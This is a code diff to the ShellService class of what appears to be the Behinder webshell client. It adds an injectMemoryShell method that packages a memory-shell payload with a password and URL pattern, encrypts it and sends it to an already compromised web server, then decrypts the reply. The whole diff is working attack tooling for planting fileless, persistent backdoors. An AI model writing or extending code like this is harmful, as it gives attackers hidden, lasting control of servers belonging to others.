@@ -2,6 +2,7 @@ package net.rebeyond.behinder.core;
 
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.FileOutputStream;
+import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -15,7 +16,6 @@ import java.util.Set;
 import javafx.application.Platform;
 import javafx.scene.control.Alert;
 import javafx.stage.Window;
-import javafx.stage.WindowEvent;
 import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONObject;
 
@@ -1144,6 +1144,23 @@ public class ShellService {
         byte[] resData = (byte[])resultObj.get("data");
         String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
         
+        JSONObject result = new JSONObject(resultTxt);
+        for (String key : result.keySet()) {
+            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
+        }
+        return result;
+    }
+
+    public JSONObject injectMemoryShell(String webEnv, String shellType, String urlPattern, String password) throws Exception {
+        Map<String, String> params = new LinkedHashMap<>();
+        params.put("password", Utils.getMD5(password));
+        params.put("shellString", new String(Params.getParamedClass("memoryshell."+shellType, params), StandardCharsets.ISO_8859_1));
+        params.put("urlPattern", urlPattern);
+
+        byte[] data = Utils.getData(this.currentKey, this.encryptType, "memoryshell."+webEnv, params, this.currentType);
+        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+        byte[] resData = (byte[])resultObj.get("data");
+        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
         JSONObject result = new JSONObject(resultTxt);
         for (String key : result.keySet()) {
             result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
